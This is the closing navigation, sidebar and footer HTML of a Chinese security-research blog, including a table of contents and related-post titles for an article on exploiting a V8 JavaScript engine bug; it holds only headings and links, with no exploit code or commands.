pull-right"><a href="/2020/02/15/v8/"><img class="next-cover" src="/img/063Kee.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">v8 Base</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2019/10/22/HeapSpray/" title="HeapSpray入门"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/heap2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-22</div><div class="title">HeapSpray入门</div></div></a></div><div><a href="/2019/12/01/CVE-2012-1876/" title="IE堆漏洞利用（CVE-2012-1876）"><img class="cover" src="/img/XsPKP4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-12-01</div><div class="title">IE堆漏洞利用（CVE-2012-1876）</div></div></a></div><div><a href="/2019/12/21/Shellcode-Write/" title="一步步编写Shellcode"><img class="cover" src="/img/9tBe6z.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-12-21</div><div class="title">一步步编写Shellcode</div></div></a></div><div><a href="/2020/02/15/v8/" title="v8 Base"><img class="cover" src="/img/063Kee.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-15</div><div class="title">v8 Base</div></div></a></div><div><a href="/2019/10/18/Win-exploitS-E-H/" title="Windows下漏洞利用 S.E.H深入分析"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/J9yzMy.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-18</div><div class="title">Windows下漏洞利用 S.E.H深入分析</div></div></a></div><div><a href="/2021/04/02/QEMU-CVE-2015-5165/" title="QEMU:CVE-2015-5165"><img class="cover" src="https://z3.ax1x.com/2021/07/09/RvdfH0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-02</div><div class="title">QEMU:CVE-2015-5165</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/%E6%88%88%E8%96%87.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Migraine殇</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/migraine-sudo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/migraine-sudo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2576361468@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://twitter.com/0xp0kerface" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎光临寒舍，右下角可以设置夜间模式</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">POC分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">Patch分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0OOB-r-amp-w"><span class="toc-number">4.1.</span> <span class="toc-text">实现OOB r&amp;w</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#how2GetShell"><span class="toc-number">4.2.</span> <span class="toc-text">how2GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">4.2.1.</span> <span class="toc-text">泄露libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JIT"><span class="toc-number">4.2.2.</span> <span class="toc-text">JIT</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">4.3.</span> <span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JS%E5%9F%BA%E7%A1%80"><span class="toc-number">5.</span> <span class="toc-text">JS基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#v8%E5%9F%BA%E7%A1%80"><span class="toc-number">6.</span> <span class="toc-text">v8基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E9%98%85%E8%AF%BB"><span class="toc-number">7.</span> <span class="toc-text">扩展阅读</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-number">8.</span> <span class="toc-text">附录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8libc%E6%B3%84%E9%9C%B2%E7%9A%84exploit"><span class="toc-number">8.1.</span> <span class="toc-text">使用libc泄露的exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Wasm%E5%86%99%E5%85%A5shellcode"><span class="toc-number">8.2.</span> <span class="toc-text">通过Wasm写入shellcode</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2099/12/14/Diary/" title="Diary"><img src="/img/IMG_7932.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Diary"/></a><div class="content"><a class="title" href="/2099/12/14/Diary/" title="Diary">Diary</a><time datetime="2099-12-13T16:01:36.000Z" title="发表于 2099-12-14 00:01:36">2099-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/30/nexus5/" title="Nexus5折腾小记"><img src="https://img-blog.csdnimg.cn/img_convert/182eb0788d06c05a6c26308aaa0150a1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nexus5折腾小记"/></a><div class="content"><a class="title" href="/2022/07/30/nexus5/" title="Nexus5折腾小记">Nexus5折腾小记</a><time datetime="2022-07-30T15:54:15.000Z" title="发表于 2022-07-30 23:54:15">2022-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/12/%E7%95%99%E7%BB%99%E8%BF%99%E4%B8%8D%E9%95%BF%E4%B8%8D%E7%9F%AD%E7%9A%84%E6%97%B6%E5%85%89/" title="留给这不长不短的时光"><img src="https://z3.ax1x.com/2021/07/17/W13xu4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="留给这不长不短的时光"/></a><div class="content"><a class="title" href="/2021/07/12/%E7%95%99%E7%BB%99%E8%BF%99%E4%B8%8D%E9%95%BF%E4%B8%8D%E7%9F%AD%E7%9A%84%E6%97%B6%E5%85%89/" title="留给这不长不短的时光">留给这不长不短的时光</a><time datetime="2021-07-12T15:53:34.000Z" title="发表于 2021-07-12 23:53:34">2021-07-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/02/QEMU-CVE-2015-5165/" title="QEMU:CVE-2015-5165"><img src="https://z3.ax1x.com/2021/07/09/RvdfH0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="QEMU:CVE-2015-5165"/></a><div class="content"><a class="title" href="/2021/04/02/QEMU-CVE-2015-5165/" title="QEMU:CVE-2015-5165">QEMU:CVE-2015-5165</a><time datetime="2021-04-02T07:52:34.000Z" title="发表于 2021-04-02 15:52:34">2021-04-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/30/mips-pwn/" title="Mips 漏洞入门与分析（CVE-2020-8423）"><img src="/img/7GdBdp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mips 漏洞入门与分析（CVE-2020-8423）"/></a><div class="content"><a class="title" href="/2021/01/30/mips-pwn/" title="Mips 漏洞入门与分析（CVE-2020-8423）">Mips 漏洞入门与分析（CVE-2020-8423）</a><time datetime="2021-01-29T17:50:25.000Z" title="发表于 2021-01-30 01:50:25">2021-01-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Migraine殇</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>